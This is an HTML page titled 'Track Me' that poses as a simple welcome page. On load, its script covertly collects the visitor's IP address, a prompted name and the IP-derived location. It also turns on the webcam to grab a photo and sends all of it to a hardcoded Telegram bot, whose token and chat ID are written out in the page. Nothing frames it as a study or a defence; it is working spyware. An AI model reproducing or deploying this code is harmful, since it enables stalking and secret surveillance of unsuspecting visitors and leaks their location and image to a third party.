<!DOCTYPE html>
<html>
<head>
    <title>Track Me</title>
    <style>
        body {
            background-image: url('img/altarys gif.gif');
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-position: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
        }
        h1, p {
            background-color: rgba(0, 0, 0, 0.5);
            padding: 20px;
            border-radius: 10px;
        }
        .camera-container {
            margin-top: 20px;
        }
        .camera-container video, .camera-container canvas {
            width: 100%;
            max-width: 400px;
            border-radius: 10px;
        }
        .camera-container button {
            margin-top: 10px;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #007BFF;
            color: white;
            cursor: pointer;
        }
        .camera-container button:hover {
            background-color: #0056b3;
        }
    </style>
    <script>
        function track() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ip = data.ip;
                    var userName = prompt("Please enter your name:");
                    fetch(`https://ipinfo.io/${ip}/json?token=YOUR_IPINFO_IO_TOKEN`)
                        .then(response => response.json())
                        .then(locationData => {
                            var location = `${locationData.city}, ${locationData.region}, ${locationData.country}`;
                            var data = `IP: ${ip}, Name: ${userName}, Location: ${location}`;
                            var botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
                            var chatId = '5410457102';
                            fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    chat_id: chatId,
                                    text: data
                                })
                            });
                        });
                });
        }

        function takeSelfie() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    video.play();
                    setTimeout(() => {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg');
                        const botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
                        const chatId = '5410457102';
                        fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                chat_id: chatId,
                                photo: imageData
                            })
                        });
                    }, 1000); // Capture after 1 second
                })
                .catch(err => {
                    console.error('Error accessing the camera:', err);
                });
        }
    </script>
</head>
<body onload="track(); takeSelfie();">
    <div>
        <h1>Welcome!</h1>
        <p>Thank you for visiting.</p>
        <div class="camera-container">
            <video id="video" autoplay></video>
            <canvas id="canvas" style="display: none;"></canvas>
        </div>
    </div>
</body>
</html>
